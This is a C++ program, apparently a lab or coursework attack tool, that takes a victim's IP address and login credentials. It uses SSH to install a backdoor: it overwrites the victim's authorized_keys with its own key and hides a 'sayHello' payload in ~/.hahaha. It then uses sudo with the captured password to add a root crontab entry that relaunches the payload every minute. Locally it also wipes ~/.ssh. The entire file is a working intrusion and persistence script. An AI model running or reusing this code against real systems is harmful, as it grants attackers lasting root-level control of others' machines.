#include <bits/stdc++.h>
using namespace std;
void cmd(string s) {
    int ret = system(s.c_str());
    cout << '\n';
    if (ret)
        cout << "\x1b[31mRE\x1b[0m : ";
    else
        cout << "\x1b[32mAC\x1b[0m: ";
    cout << s << '\n';
}
void cmd_on_victim(string ssh_prefix, string s) {
    cmd(ssh_prefix + " \'" + s + "\'");
}
int main(int argc, char **argv) {
    if (argc < 4) {
        cout << "Usage: " << argv[0] << " <victim IP address> <username> <password>\n";
        return 0;
    }

    // generate key
    cmd("rm ~/.ssh/*");
    cmd("ssh-keygen -t rsa -N \"\" -f ~/.ssh/id_rsa");
    
    string ip_addr  = string(argv[1]);
    string username = string(argv[2]);
    string password = string(argv[3]);
    string ssh_prefix = "ssh "
        "-o IdentitiesOnly=yes "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=~/.ssh/known_hosts " 
        + username + "@" + ip_addr;

    // login with password and set public key in victim
    cmd("cat ~/.ssh/id_rsa.pub | sshpass -p \'" + password + "\' " + ssh_prefix + " \'cat > ~/.ssh/authorized_keys\'");
    cmd_on_victim(ssh_prefix, "chmod 600 ~/.ssh/authorized_keys");

    // scp payload to /home/<username>/.hahaha
    cmd_on_victim(ssh_prefix, "mkdir ~/.hahaha");
    cmd("scp sayHello " + username + "@" + ip_addr + ":~/.hahaha/sayHello");
    
    // set crontab
    string crontab = "* * * * * root pgrep sayHello > /dev/null || cd /home/" + username + "/.hahaha && ./sayHello";
    ofstream *add_crontab = new ofstream("add_crontab.sh");
    *add_crontab << "#! /bin/bash\n\n";
    *add_crontab << "echo \"" + password + "\" | sudo -S sh -c \'echo \"" + crontab + "\" >> /etc/crontab\'";
    delete add_crontab;

    cmd("scp add_crontab.sh " + username + "@" + ip_addr + ":~/.hahaha/add_crontab.sh");
    cmd("rm add_crontab.sh");
    cmd_on_victim(ssh_prefix, "cd /home/" + username + "/.hahaha && chmod +x add_crontab.sh && ./add_crontab.sh");
    cmd_on_victim(ssh_prefix, "echo \"" + password + "\" | sudo -S /etc/init.d/cron restart");
}
